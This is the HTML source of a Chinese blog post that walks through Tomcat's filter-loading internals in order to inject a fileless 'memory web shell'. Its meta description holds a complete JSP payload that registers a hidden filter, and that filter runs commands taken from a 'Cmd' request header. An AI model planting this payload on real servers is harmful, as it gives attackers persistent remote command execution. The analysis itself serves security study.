+在 StandardContext 的 filterDefs 中添加 FilterDef (validateFilterMap 验证) 向 filterMaps 中添加 FilterMap 将对应的 FilterConfig (包含 FilterDef) 添加到 filterConfigs 0x03 编写内存马 还有一个问题, 如何获取 StandardContext
+方法很多, 可以从 request 获取, 也可以从 ContextClassLoader ThreadLocal MBean 中获取
+因为 JSP 默认就可以调用 request 对象, 所以下面先以 request 为例,
+最终 payload 如下
+&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.core.ApplicationFilterConfig&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt; &lt;%@ page import=&#34;java.util.Map&#34; %&gt; &lt;%@ page import=&#34;java.io.*&#34; %&gt; &lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34; %&gt; &lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34; %&gt; &lt;%@ page import=&#34;java.lang.reflect.Constructor&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.Context&#34; %&gt; &lt;% //获取ServletContext。通过反射获取 ServletContext 中的 ApplicationContext，然后再通过反射获取 ApplicationContext 中的 StandardContext 对象。 ServletContext servletContext = request.getSession().getServletContext(); Field appctxField = servletContext.getClass().getDeclaredField(&#34;context&#34;); appctxField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctxField.get(servletContext);//通过反射获取 servletContext 中的 context 字段的值，并将其转换为 ApplicationContext。 Field stdctxField = applicationContext.getClass().getDeclaredField(&#34;context&#34;); stdctxField.setAccessible(true); StandardContext standardContext = (StandardContext) stdctxField.get(applicationContext);//通过反射获取 applicationContext 对象中的 context 字段的值，并将其转换为 StandardContext。 // 获取 FilterConfigs Field filterConfigsField = standardContext.getClass().getDeclaredField(&#34;filterConfigs&#34;); filterConfigsField.setAccessible(true); Map filterConfigs = (Map) filterConfigsField.get(standardContext); // 编写 Filter String filterName = &#34;EvilFilter&#34;; if (filterConfigs.get(filterName)==null) { Filter filter = new Filter() { @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest; PrintWriter pw = servletResponse.getWriter(); String cmd = httpServletRequest.getHeader(&#34;Cmd&#34;); if (cmd != null) { Process process = Runtime.getRuntime().exec(cmd); InputStream input = process.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(input)); String line = null; while ((line = br.readLine()) != null){ pw.write(line); } br.close(); input.close(); pw.write(&#34;\n&#34;); } } }; // 创建 FilterDef,为了创建 FilterConfig,即 ApplicationFilterConfig FilterDef filterDef = new FilterDef(); filterDef.setFilterName(filterName); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); // 添加 FilterDef standardContext.addFilterDef(filterDef); // 创建 FilterMap FilterMap filterMap = new FilterMap(); filterMap.setFilterName(filterName); filterMap.addURLPattern(&#34;/*&#34;); filterMap.setDispatcher(DispatcherType.REQUEST.name()); // setDispatcher是FilterMap的一个设置过滤器的调度类型方法，这里设置了过滤器在 REQUEST 调度类型下触发，即当收到普通的 HTTP 请求时，过滤器会被执行。 // 添加 FilterMap 到首位 standardContext.addFilterMapBefore(filterMap); // 因为 ApplicationFilterConfig 的构造方法是不带 public 的, 即默认的作用域为 package, 所以我们需要通过反射来实例化该对象 Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); // 添加 FilterConfig filterConfigs.put(filterName, applicationFilterConfig); out.print(&#34;inject success&#34;); } %&gt; " />
+<meta property="og:locale" content="en-us" /><meta property="og:image" content="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+
+
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/index.css">
+<link href="/index.xml" rel="alternate" type="application/rss+xml" title="末流双非的救赎之道">
+</head>
+
+<body>
+  <nav class="headnav">
+  <a href="/" class="logo">w0s1np</a>
+  <ul id="menu">
+    
+    <li><a href="/blog/">归档</a></li>
+    
+    <li><a href="/tags/">标签</a></li>
+    
+    <li><a href="/search">搜索</a></li>
+    
+    <li><a href="/about/">关于</a></li>
+    
+    <li><a href="/index.xml" target="_blank">RSS</a></li>
+  </ul>
+</nav>
+  <section>
+    
+    <div class="body-title">Tomcat_Filter型内存马分析</div>
+
+    
+    <div class="post-meta">
+      <time> 2024-10-01</time>
+      
+
+      <span class="tag-node">
+        
+        标签：
+        
+        <a href="/tags/java">#Java</a>
+        
+        
+      </span>
+
+    </div>
+    
+
+    
+    <div class="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-filter加载流程">0x01 Filter加载流程</a></li>
+    <li><a href="#0x02-filter流程分析">0x02 Filter流程分析</a>
+      <ul>
+        <li><a href="#filterchain之后的流程">filterChain之后的流程</a></li>
+        <li><a href="#filterchain是如何来的">filterChain是如何来的</a></li>
+        <li><a href="#findfiltermaps和findfilterconfig">findFilterMaps和findFilterConfig</a></li>
+        <li><a href="#filter相关对象">Filter相关对象</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <article class="post-content">
+      
+      <h1 id="tomcat-filter-型内存马分析">Tomcat Filter 型内存马分析</h1>
+<p>目的：<strong>动态注册恶意 Filter，并且将其放到filter-chain最前面</strong></p>
+<h2 id="0x01-filter加载流程">0x01 Filter加载流程</h2>
+<p>maven 添加如下 package</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">tomcat</span><span class="o">-</span><span class="n">catalina</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></div><p>编写 TestFilter</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">memfilter</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.annotation.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@WebFilter</span><span class="p">(</span><span class="n">filterName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;TestFilter&#34;</span><span class="p">,</span><span class="n">urlPatterns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/*&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestFilter</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">FilterConfig</span><span class="w"> </span><span class="n">config</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Filter 初始化创建&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">chain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;执行过滤操作&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image.png" alt="image.png"></p>
+<p>因为之前写过一个命令执行的 filter，但那是直接写在 server 端的代码。但是我们如何在服务已启动时，去动态注册一个新的恶意 filter 呢？</p>
+<h2 id="0x02-filter流程分析">0x02 Filter流程分析</h2>
+<p>在<code>doFilter</code> 下断点：</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%201.png" alt="image.png"></p>
+<p>调用栈</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">doFilter</span><span class="p">:</span><span class="mi">18</span><span class="p">,</span> <span class="n">TestFilter</span> <span class="p">(</span><span class="n">memfilter</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">internalDoFilter</span><span class="p">:</span><span class="mi">168</span><span class="p">,</span> <span class="n">ApplicationFilterChain</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">doFilter</span><span class="p">:</span><span class="mi">144</span><span class="p">,</span> <span class="n">ApplicationFilterChain</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">168</span><span class="p">,</span> <span class="n">StandardWrapperValve</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">90</span><span class="p">,</span> <span class="n">StandardContextValve</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">482</span><span class="p">,</span> <span class="n">AuthenticatorBase</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">authenticator</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">130</span><span class="p">,</span> <span class="n">StandardHostValve</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">93</span><span class="p">,</span> <span class="n">ErrorReportValve</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">valves</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">660</span><span class="p">,</span> <span class="n">AbstractAccessLogValve</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">valves</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">74</span><span class="p">,</span> <span class="n">StandardEngineValve</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">service</span><span class="p">:</span><span class="mi">346</span><span class="p">,</span> <span class="n">CoyoteAdapter</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">connector</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">service</span><span class="p">:</span><span class="mi">388</span><span class="p">,</span> <span class="n">Http11Processor</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">coyote</span><span class="o">.</span><span class="n">http11</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">process</span><span class="p">:</span><span class="mi">63</span><span class="p">,</span> <span class="n">AbstractProcessorLight</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">coyote</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">process</span><span class="p">:</span><span class="mi">936</span><span class="p">,</span> <span class="n">AbstractProtocol</span><span class="err">$</span><span class="n">ConnectionHandler</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">coyote</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">doRun</span><span class="p">:</span><span class="mi">1791</span><span class="p">,</span> <span class="n">NioEndpoint</span><span class="err">$</span><span class="n">SocketProcessor</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">net</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span><span class="p">:</span><span class="mi">52</span><span class="p">,</span> <span class="n">SocketProcessorBase</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">net</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">runWorker</span><span class="p">:</span><span class="mi">1190</span><span class="p">,</span> <span class="n">ThreadPoolExecutor</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">threads</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span><span class="p">:</span><span class="mi">659</span><span class="p">,</span> <span class="n">ThreadPoolExecutor</span><span class="err">$</span><span class="n">Worker</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">threads</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span><span class="p">:</span><span class="mi">63</span><span class="p">,</span> <span class="n">TaskThread</span><span class="err">$</span><span class="n">WrappingRunnable</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">threads</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span><span class="p">:</span><span class="mi">745</span><span class="p">,</span> <span class="n">Thread</span> <span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="filterchain之后的流程">filterChain之后的流程</h3>
+<p>跟进<code>StandardWrapperVavle.invoke()</code>方法:</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%202.png" alt="image.png"></p>
+<p>执行了 filterChain.doFilter 方法, 继续跟进</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%203.png" alt="image.png"></p>
+<p>在 doFilter 内会检测 jvm 是否开启了安全模式, 然后继续执行 this.internalDoFilter 方法</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%204.png" alt="image.png"></p>
+<p>internalDoFilter 会从 this.filters 数组中依次取出 filterConfig 对象, 然后通过 filterConfig.getFilter() 得到 Filter 实例, 最后调用其 doFilter 方法</p>
+<p>最后再回到我们自己写的 doFilter 方法。</p>
+<p>PS：所以我们执行的是 filterConfig 对象中的 filter 属性值的对象。</p>
+<p>现在知道是通过从 this.filters 数组中依次取出 filterConfig 对象, 然后通过 filterConfig.getFilter() 得到 Filter 实例, 最后调用其 doFilter 方法。</p>
+<h3 id="filterchain是如何来的">filterChain是如何来的</h3>
+<p>然后我们回到 StandardWrapperValve, 往前面翻翻看这个 filterChain 是怎么来的</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%205.png" alt="image.png"></p>
+<p>这里通过 ApplicationFilterFactory.createFilterChain() 创建 filterChain</p>
+<p>需要注意创建过程是动态的, 即我们每发起一次请求, tomcat 都会执行一遍 createFilterChain, 这也为后面内存马的植入做了铺垫</p>
+<p>重新在这里下断点，跟进 createFilterChain 方法</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%206.png" alt="image.png"></p>
+<p>首先从 Request 对象中获取 filterChain, 如果 filterChain 不存在, 就自己新建一个, 再设置到 req 内</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%207.png" alt="image.png"></p>
+<p>然后从 wrapper 中获取 StandardContext 对象, 并且调用 findFilterMaps 方法得到 filterMaps</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%208.png" alt="image.png"></p>
+<p>最后遍历 filterMaps, 通过 filterMap.getFilterName() 从 context 中寻找对应的 FilterConfig 并且添加至 filterChain</p>
+<p>这里与 StandardContext 相关的有两个方法: findFilterMaps 和 findFilterConfig, 可以说这两个方法决定了我们的 Filter 能否成功添加到至 filterChain 并被调用</p>
+<h3 id="findfiltermaps和findfilterconfig">findFilterMaps和findFilterConfig</h3>
+<p>先跟进 findFilterMaps 方法</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%209.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2010.png" alt="image.png"></p>
+<p>filterMaps 是 ContextFilterMaps 的实例, 后者相当于一个 Array</p>
+<p>继续搜索与 FilterMap 相关的其它方法</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2011.png" alt="image.png"></p>
+<p>通过 addfilterMap 和 addFilterMapBefore 这两个方法可以向 filterMaps 中添加 FilterMap</p>
+<p>所以当我们构造好 FilterMap 之后，可以通过 addFilterMapBefore 加入到 filterMaps 的首位。</p>
+<p>其中注意 validateFilterMap</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2012.png" alt="image.png"></p>
+<p>该方法会对传入的 FilterMap 进行验证, 如果 this.findFilterDef 的返回值为 null 则会抛出异常</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2013.png" alt="image.png"></p>
+<p>该方法会对传入的 FilterMap 进行验证, 如果 this.findFilterDef 的返回值为 null 则会抛出异常</p>
+<p>所以后面还需要对 standardContext 添加 FilterDef</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2014.png" alt="image.png"></p>
+<p>filterDefs 本质也是一个 HashMap, 并且存在 addFilterDef 方法</p>
+<p>再看一下 FilterMap 的定义</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2015.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2016.png" alt="image.png"></p>
+<p>其内部存在 filterName 和 urlPatterns 属性, 分别对应之前的 getFilterName 和 <code>@WebFilter</code> 注解中的 urlPatterns</p>
+<p>现在回到 StandardContext 的 findFilterConfig 方法：</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2017.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2018.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2019.png" alt="image.png"></p>
+<p>filterConfigs 的本质也是 HashMap</p>
+<p>但在 StandardContext 中涉及到对 filterConfigs 操作的只有 filterStart 和 filterStop 方法, 而两者仅在 tomcat 启动和停止时被调用, 因此我们在运行时只能通过反射的方式修改 filterConfigs</p>
+<p>不过仍然需要看看 filterStart 是怎么初始化 filterConfigs 的</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2020.png" alt="image.png"></p>
+<p>方法内部遍历了 this.filterDefs 并且以 context 和 filterDef 为参数实例化 ApplicationFilterConfig 作为 filterConfig, 然后将其 put 放入 filterConfigs</p>
+<p>继续看 ApplicationFilterConfig 的定义</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2021.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2022.png" alt="image.png"></p>
+<p>内部存在 filterDef 和 filter 属性, 前者通过构造方法赋值, 并且调用其 getFilter 方法来获取 Filter 实例, 然后赋值给后者</p>
+<p>FilterDef 的定义</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2023.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2024.png" alt="image.png"></p>
+<p>filter 是被调用 Filter 实例, filterClass 是 Filter 对应的 Class, filterName 就是 Filter 的名称, 而且三者都有对应的 getter 和 setter</p>
+<p>综上, Filter 的加载流程如下</p>
+<ol>
+<li>通过 ApplicationFilterFactory.createFilterChain() 创建 FilterChain</li>
+<li>调用 StandardContext.findFilterMaps() 得到 filterMaps</li>
+<li>遍历 filterMaps, 依次从 StandardContext 中用 filterMap.getFilterName() 获取对应的 filterConfig, 并将其放入 FilterChain</li>
+<li>执行 FilterChain.doFilter() 并在内部调用 internalDoFilter 方法</li>
+<li>依次执行 filterConfig.getFilter() 获取 Filter 实例, 并最终调用其 doFilter 方法</li>
+</ol>
+<h3 id="filter相关对象">Filter相关对象</h3>
+<p>在编写内存马之前, 我们先梳理一下之前出现的各种以 Filter 开头的对象</p>
+<ul>
+<li>FilterMap: 存在 filterName 和 urlPatterns 属性, 对应 Filter 的名称和匹配规则</li>
+<li>FilterConfig: 这里具体指 ApplicationFilterConfig, 存在 Filter 和 FilterDef 属性, 其中 Filter 在构造函数中通过 filterDef.getFilter() 取得</li>
+<li>FilterDef: 存在 filter filterClass filterName 属性, 其中 filter 为被调用的 Filter 实例</li>
+</ul>
+<p>然后是位于 StandardContext 中的以 filter 开头的属性</p>
+<ul>
+<li>filterMaps: 本质为 Array, 存放 FilterMap</li>
+<li>filterConfigs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterConfig</li>
+<li>filterDefs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterDef</li>
+</ul>
+<p>根据上面加载流程, 我们注入内存马的过程为</p>
+<ol>
+<li>在 StandardContext 的 filterDefs 中添加 FilterDef (validateFilterMap 验证)</li>
+<li>向 filterMaps 中添加 FilterMap</li>
+<li>将对应的 FilterConfig (包含 FilterDef) 添加到 filterConfigs</li>
+</ol>
+<h1 id="0x03-编写内存马">0x03 编写内存马</h1>
+<p>还有一个问题, 如何获取 StandardContext</p>
+<p>方法很多, 可以从 request 获取, 也可以从 ContextClassLoader ThreadLocal MBean 中获取</p>
+<p>因为 JSP 默认就可以调用 request 对象, 所以下面先以 request 为例,</p>
+<p>最终 payload 如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;java.lang.reflect.Field&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.catalina.core.ApplicationFilterConfig&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.catalina.core.ApplicationContext&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.catalina.core.StandardContext&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;java.util.Map&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;java.io.*&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;java.lang.reflect.Constructor&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.catalina.Context&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl">  <span class="o">//</span><span class="n">获取ServletContext</span><span class="err">。</span><span class="n">通过反射获取</span> <span class="n">ServletContext</span> <span class="n">中的</span> <span class="n">ApplicationContext</span><span class="err">，</span><span class="n">然后再通过反射获取</span> <span class="n">ApplicationContext</span> <span class="n">中的</span> <span class="n">StandardContext</span> <span class="n">对象</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">getSession</span><span class="p">()</span><span class="o">.</span><span class="n">getServletContext</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Field</span> <span class="n">appctxField</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;context&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">appctxField</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
